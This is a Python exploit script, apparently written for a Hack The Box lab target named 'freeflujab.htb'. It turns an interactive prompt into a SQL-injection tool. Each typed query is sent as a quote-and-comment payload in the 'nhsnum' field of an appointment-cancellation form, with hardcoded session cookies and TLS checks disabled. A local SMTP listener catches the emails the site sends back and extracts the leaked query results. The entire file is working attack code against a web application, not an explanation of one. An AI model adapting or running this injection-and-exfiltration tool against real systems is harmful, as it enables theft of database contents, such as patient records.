from smtpd import SMTPServer
from cmd import Cmd
import requests
import asyncore
import threading
import re

class Terminal(Cmd):
  prompt = "INPUT => "

  def inject(self, args):
    payload = f"' {args}-- - "
    # nhsnum='+union+select+1,2,version(),4,5--+-&submit=Cancel+Appointment
    data = {'nhsnum': payload, 'submit': "Cancel+Appointment"}
    # Cookie: Modus=Q29uZmlndXJlPVRydWU=; Patient=122f1def6a8b5601963ee3163b041696; Registered=MTIyZjFkZWY2YThiNTYwMTk2M2VlMzE2M2IwNDE2OTY9VHJ1ZQ==
    cookies = {
      'Patient': '122f1def6a8b5601963ee3163b041696',
      'Registered': 'MTIyZjFkZWY2YThiNTYwMTk2M2VlMzE2M2IwNDE2OTY9VHJ1ZQ==',
      'Modus': 'Q29uZmlndXJlPVRydWU=' 
    }
    r = requests.post('https://freeflujab.htb/?cancel', data=data, cookies=cookies, verify=False)
    print(payload)

  def default(self, args):
    self.inject(args)

class EmailServer(SMTPServer):
  def process_message(self, peer, mailform, rcptos, data, **kwargs):
    response = str(data, 'utf-8')
    data = re.findall(r'- Ref:(.*)', response)[0]
    print()
    print(data)

def mail():
  EmailServer(('0.0.0.0', 25), None)
  asyncore.loop()

threads = []
t = threading.Thread(target=mail)
threads.append(t)
t.start()

term = Terminal()
term.cmdloop()